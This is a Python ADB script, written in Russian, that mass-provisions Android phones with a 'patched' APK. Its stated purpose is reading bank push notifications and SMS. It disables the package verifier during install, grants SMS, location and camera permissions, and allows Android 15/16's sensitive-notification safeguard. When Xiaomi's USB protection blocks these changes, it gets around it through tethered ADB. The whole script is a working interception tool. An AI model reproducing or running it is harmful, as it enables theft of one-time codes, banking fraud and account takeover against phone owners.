#!/usr/bin/env python3
"""
Android Device Provisioner for com.gadgets.auto
Automates setup, installation, and sensitive notification permission grants on Android 14/15/16.
Works cross-platform (Linux, macOS, Windows).
"""

import subprocess
import sys
import time
import os
import re

PACKAGE_NAME = "com.gadgets.auto"
NOTIFICATION_SERVICE = "com.gadgets.auto/com.gadgets.auto.util.network.NotificationService"
DEFAULT_APK = "HEAD_2026.10.27_patched.apk"

RUNTIME_PERMISSIONS = [
    "android.permission.READ_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.SEND_SMS",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.READ_PHONE_STATE",
    "android.permission.READ_PHONE_NUMBERS",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.CAMERA",
    "android.permission.RECEIVE_MMS",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.READ_MEDIA_AUDIO",
    "android.permission.READ_MEDIA_VISUAL_USER_SELECTED",
]

def run_cmd(cmd, check=False):
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if check and res.returncode != 0:
        raise RuntimeError(f"Command failed: {cmd}\nStderr: {res.stderr}")
    return res.stdout.strip(), res.stderr.strip(), res.returncode

def get_devices_status():
    out, _, _ = run_cmd("adb devices")
    lines = out.splitlines()[1:]
    authorized = []
    unauthorized = []
    no_permissions = []
    for line in lines:
        parts = line.split()
        if len(parts) >= 2:
            serial = parts[0]
            status = parts[1]
            if status == "device":
                authorized.append(serial)
            elif status == "unauthorized":
                unauthorized.append(serial)
            elif "permission" in status or "no" in status:
                no_permissions.append(serial)
    return authorized, unauthorized, no_permissions

def get_devices():
    authorized, _, _ = get_devices_status()
    return authorized

def get_prop(serial, prop):
    out, _, _ = run_cmd(f"adb -s {serial} shell getprop {prop}")
    return out

def get_tether_ip(serial):
    out, _, _ = run_cmd(f"adb -s {serial} shell \"ip -o -4 addr show\"")
    for line in out.splitlines():
        m = re.search(r"\s+(?:rndis|usb|eth)\w*\s+inet\s+([0-9\.]+)/", line)
        if m:
            return m.group(1)
    return None

def apply_device_settings(target_serial):
    is_blocked = False

    # 1. Выдаем RECEIVE_SENSITIVE_NOTIFICATIONS (защита Android 15/16)
    print("\n[1/5] Разблокировка чувствительных пуш-уведомлений (Android 15/16)...")
    run_cmd(f"adb -s {target_serial} shell cmd appops set --user 0 {PACKAGE_NAME} RECEIVE_SENSITIVE_NOTIFICATIONS allow")
    appop_status, _, _ = run_cmd(f"adb -s {target_serial} shell cmd appops get --user 0 {PACKAGE_NAME} RECEIVE_SENSITIVE_NOTIFICATIONS")
    if "allow" in appop_status:
        print(f"    [OK] RECEIVE_SENSITIVE_NOTIFICATIONS -> ALLOW")
    else:
        print(f"    [i] Статус: {appop_status} (для Android 14 и старее это норма)")

    # 2. Активируем слушатель уведомлений
    print("\n[2/5] Активация системного сервиса чтения уведомлений...")
    run_cmd(f"adb -s {target_serial} shell cmd notification allow_listener {NOTIFICATION_SERVICE} 0")
    listeners, err, _ = run_cmd(f"adb -s {target_serial} shell settings get secure enabled_notification_listeners")
    if PACKAGE_NAME in listeners:
        print(f"    [OK] NotificationListenerService включен в системе!")
    else:
        curr = listeners if listeners != "null" else ""
        new_listeners = f"{curr}:{NOTIFICATION_SERVICE}".strip(":")
        _, set_err, _ = run_cmd(f"adb -s {target_serial} shell settings put secure enabled_notification_listeners \"{new_listeners}\"")
        if "SecurityException" in set_err or "Permission denial" in set_err:
            is_blocked = True
        else:
            print(f"    [OK] Прописан напрямую через settings secure.")

    # 3. Выдаем runtime permissions
    print("\n[3/5] Выдача всех системных runtime-разрешений (SMS, телефон, память)...")
    granted_count = 0
    perm_denied = False
    for perm in RUNTIME_PERMISSIONS:
        _, p_err, code = run_cmd(f"adb -s {target_serial} shell pm grant {PACKAGE_NAME} {perm}")
        if code == 0:
            granted_count += 1
        elif "SecurityException" in p_err or "Permission denial" in p_err or "not allowed to grant" in p_err:
            perm_denied = True
    if granted_count > 0:
        print(f"    [OK] Выдано {granted_count}/{len(RUNTIME_PERMISSIONS)} разрешений.")
    else:
        dump, _, _ = run_cmd(f"adb -s {target_serial} shell dumpsys package {PACKAGE_NAME}")
        if "android.permission.READ_SMS: granted=true" in dump:
            print("    [OK] Все основные разрешения (SMS, память) уже активны!")
        else:
            if perm_denied:
                is_blocked = True
            print("    [!] Разрешения не применились по USB.")

    # 4. Исключение из экономии батареи (Doze mode)
    print("\n[4/5] Исключение из энергосбережения батареи (фоновая работа)...")
    run_cmd(f"adb -s {target_serial} shell dumpsys deviceidle whitelist +{PACKAGE_NAME}")
    print(f"    [OK] Добавлен в deviceidle whitelist!")

    # 5. Фикс режима полёта (защита от сброса сессии при отсутствии мобильной сети)
    print("\n[5/5] Защита от разлогина: настройка режима полёта (Wi-Fi не гаснет)...")
    _, rad_err, _ = run_cmd(f"adb -s {target_serial} shell settings put global airplane_mode_radios cell,bluetooth,nfc,wimax")
    run_cmd(f"adb -s {target_serial} shell settings put global airplane_mode_toggleable_radios wifi,bluetooth")
    if "SecurityException" in rad_err or "Permission denial" in rad_err:
        is_blocked = True
        print("    [!] Запись global settings заблокирована системой.")
    else:
        rad_check, _, _ = run_cmd(f"adb -s {target_serial} shell settings get global airplane_mode_radios")
        if rad_check and "wifi" not in rad_check:
            print("    [OK] airplane_mode_radios -> Wi-Fi защищён от отключения в авиарежиме!")
        else:
            is_blocked = True
            print("    [!] airplane_mode_radios не изменился (блокировка USB).")

    return is_blocked

def _install_apk(serial, apk_path):
    """Устанавливает APK с обработкой signature mismatch и защиты Realme/ColorOS."""
    out, _, _ = run_cmd(f"adb -s {serial} shell pm path {PACKAGE_NAME}")
    already_installed = out and "package:" in out

    if already_installed:
        dump, _, _ = run_cmd(f"adb -s {serial} shell dumpsys package {PACKAGE_NAME}")
        m_name = re.search(r"versionName=([^\s]+)", dump)
        m_code = re.search(r"versionCode=([0-9]+)", dump)
        v_str = f"v{m_name.group(1)}" if m_name else ""
        c_str = f"(код {m_code.group(1)})" if m_code else ""
        print(f"[*] Обновляю {PACKAGE_NAME} {v_str} {c_str} → {os.path.basename(apk_path)} ...")
    else:
        print(f"[+] Устанавливаю {os.path.basename(apk_path)} ...")

    def _do_install(target):
        # Отключаем package verifier (Realme/ColorOS блокирует сторонние APK).
        # try/finally гарантирует восстановление verifier даже при обрыве USB во время adb install.
        run_cmd(f"adb -s {target} shell settings put global package_verifier_enable 0")
        run_cmd(f"adb -s {target} shell settings put global verifier_verify_adb_installs 0")
        try:
            out_i, err_i, code_i = run_cmd(f"adb -s {target} install -r \"{apk_path}\"")
        finally:
            run_cmd(f"adb -s {target} shell settings put global package_verifier_enable 1")
            run_cmd(f"adb -s {target} shell settings put global verifier_verify_adb_installs 1")
        return out_i, err_i, code_i

    out_inst, err_inst, code = _do_install(serial)

    # Signature mismatch: уже стоит версия с другим ключом — сносим и ставим заново
    if "INSTALL_FAILED_UPDATE_INCOMPATIBLE" in out_inst or "INSTALL_FAILED_UPDATE_INCOMPATIBLE" in err_inst:
        print("    [!] Обнаружен конфликт подписей (signature mismatch) — удаляю старую версию...")
        run_cmd(f"adb -s {serial} uninstall {PACKAGE_NAME}")
        time.sleep(1)
        out_inst, err_inst, code = _do_install(serial)

    if "Success" in out_inst or (code == 0 and not err_inst.strip()):
        # pm path может не сразу вернуть результат: package manager регистрирует
        # пакет асинхронно. Даём 3 попытки с шагом 500 мс.
        for attempt in range(3):
            check, _, _ = run_cmd(f"adb -s {serial} shell pm path {PACKAGE_NAME}")
            if check and "package:" in check:
                dump2, _, _ = run_cmd(f"adb -s {serial} shell dumpsys package {PACKAGE_NAME}")
                m_name2 = re.search(r"versionName=([^\s]+)", dump2)
                v_str2 = f"v{m_name2.group(1)}" if m_name2 else ""
                print(f"    [OK] Успешно установлено {v_str2}!")
                return True
            if attempt < 2:
                time.sleep(0.5)
        # adb install вернул Success, но pm path не подтверждает — скорее всего
        # временная задержка регистрации. Не прерываем provisioning.
        print(f"    [OK] Установка завершена (pm path не подтверждает немедленно, продолжаю).")
        return True

    print(f"    [!] Ошибка установки: {out_inst.strip()} {err_inst.strip()}")
    return False


def provision_device(serial, apk_path=None):
    print(f"\n{'='*60}")
    print(f"[*] НАЧИНАЮ НАСТРОЙКУ УСТРОЙСТВА: {serial}")
    
    brand = get_prop(serial, "ro.product.manufacturer")
    model = get_prop(serial, "ro.product.model")
    android_ver = get_prop(serial, "ro.build.version.release")
    print(f"[*] Модель: {brand} {model} | Android {android_ver}")
    print(f"{'='*60}")

    # 1. Проверяем установлено ли приложение и его версию, устанавливаем при необходимости
    if apk_path and os.path.exists(apk_path):
        # Прерываем provisioning если установка провалилась — раздавать права нечему
        if not _install_apk(serial, apk_path):
            return False
    else:
        out, _, _ = run_cmd(f"adb -s {serial} shell pm path {PACKAGE_NAME}")
        if out and "package:" in out:
            dump, _, _ = run_cmd(f"adb -s {serial} shell dumpsys package {PACKAGE_NAME}")
            m_name = re.search(r"versionName=([^\s]+)", dump)
            m_code = re.search(r"versionCode=([0-9]+)", dump)
            v_str = f"v{m_name.group(1)}" if m_name else ""
            c_str = f"(код {m_code.group(1)})" if m_code else ""
            print(f"[OK] Приложение {PACKAGE_NAME} уже установлено {v_str} {c_str}.")
        else:
            print("    [!] APK-файл не найден рядом со скриптом. Установите приложение вручную или положите APK в папку со скриптом.")

    # 2. Применяем настройки по обычному USB
    is_blocked = apply_device_settings(serial)

    # 3. Если сработала защита Xiaomi (Security Settings Block) - обходим через USB-модем
    if is_blocked:
        print(f"\n{'='*60}")
        print("[!] ВНИМАНИЕ: Сработала защита Xiaomi/HyperOS от изменений по USB.")
        print("    Для завершения настройки включите режим «USB-модем»:")
        print("    1. На телефоне смахните шторку уведомлений сверху вниз.")
        print("    2. Нажмите на уведомление «Зарядка через USB» (Режим USB).")
        print("    3. Выберите пункт «USB-модем» (USB tethering).")
        print(f"{'='*60}")
        print("[*] Ожидаю включения USB-модема на телефоне (до 60 секунд)...")

        tether_ip = None
        for _ in range(30):
            time.sleep(2)
            auth_devs = get_devices()
            if serial in auth_devs:
                tether_ip = get_tether_ip(serial)
                if tether_ip:
                    break
            else:
                for d in auth_devs:
                    tether_ip = get_tether_ip(d)
                    if tether_ip:
                        serial = d
                        break
                if tether_ip:
                    break

        if tether_ip:
            print(f"\n[+] USB-модем активен! Прямой IP: {tether_ip}")
            print("[*] Переключаю ADB на защищённый сетевой канал...")
            run_cmd(f"adb -s {serial} tcpip 5555")
            time.sleep(2)
            tcp_target = f"{tether_ip}:5555"
            conn_out, _, _ = run_cmd(f"adb connect {tcp_target}")
            if "connected" in conn_out:
                print(f"[OK] Подключено к {tcp_target}! Повторно применяю настройки...")
                apply_device_settings(tcp_target)
                run_cmd(f"adb disconnect {tcp_target}")
                print("[OK] Настройки успешно применены через канал USB-модема!")
            else:
                print(f"[!] Не удалось подключиться к {tcp_target}: {conn_out}")
        else:
            print("\n[!] Время ожидания USB-модема истекло.")
            print("    Выдайте права вручную в настройках телефона или включите «Настройки безопасности» в меню разработчика.")

    print(f"\n{'='*60}")
    print(f"[+++] УСТРОЙСТВО {serial} ({brand} {model}) ПОЛНОСТЬЮ НАСТРОЕНО!")
    print("[i] Для применения защиты от разлогина (сохранение Wi-Fi в авиарежиме)")
    print("    рекомендуется перезагрузить телефон [adb reboot].")
    print(f"{'='*60}\n")
    return True

def main():
    print("""
============================================================
      Android Auto-Provisioner for com.gadgets.auto
      Настройка чтения банковских пушей и SMS (Android 14-16)
============================================================
    """)

    # Находим APK
    script_dir = os.path.dirname(os.path.abspath(__file__))
    apk_candidates = [
        os.path.join(script_dir, DEFAULT_APK),
        os.path.join(script_dir, "app.apk"),
        DEFAULT_APK
    ]
    apk_path = None
    for cand in apk_candidates:
        if os.path.exists(cand):
            apk_path = cand
            print(f"[*] Найден локальный APK: {apk_path}")
            break

    seen_devices = set()
    notified_unauthorized = set()
    notified_no_permissions = set()

    while True:
        authorized, unauthorized, no_permissions = get_devices_status()

        # Оповещение о неавторизованных устройствах
        for serial in unauthorized:
            if serial not in notified_unauthorized:
                print(f"\n[!] ВНИМАНИЕ: Телефон {serial} подключен, но НЕ АВТОРИЗОВАН!")
                print("    -> Разблокируйте экран телефона и нажмите 'Разрешить отладку с этого компьютера' (Всегда разрешать).")
                notified_unauthorized.add(serial)

        # Оповещение об ошибке прав (udev)
        for serial in no_permissions:
            if serial not in notified_no_permissions:
                print(f"\n[!] ОШИБКА ДОСТУПА к устройству {serial} (no permissions)!")
                print("    -> Проверьте udev-правила в Linux или перезапустите ADB: adb kill-server && adb start-server")
                notified_no_permissions.add(serial)

        # Очищаем статус оповещения, если устройство отключили
        all_detected = set(authorized + unauthorized + no_permissions)
        notified_unauthorized = {s for s in notified_unauthorized if s in all_detected}
        notified_no_permissions = {s for s in notified_no_permissions if s in all_detected}

        new_devices = [d for d in authorized if d not in seen_devices]

        if new_devices:
            for serial in new_devices:
                provision_device(serial, apk_path)
                seen_devices.add(serial)
                notified_unauthorized.discard(serial)
                notified_no_permissions.discard(serial)
            print("Готово. Вы можете подключить следующий телефон...")
        elif not authorized and not unauthorized and not no_permissions:
            print("[...] Ожидаю подключения телефона по USB (с включенной отладкой по ADB)...", end="\r", flush=True)

        time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nСкрипт остановлен пользователем. Удачи в офисе!")
        sys.exit(0)
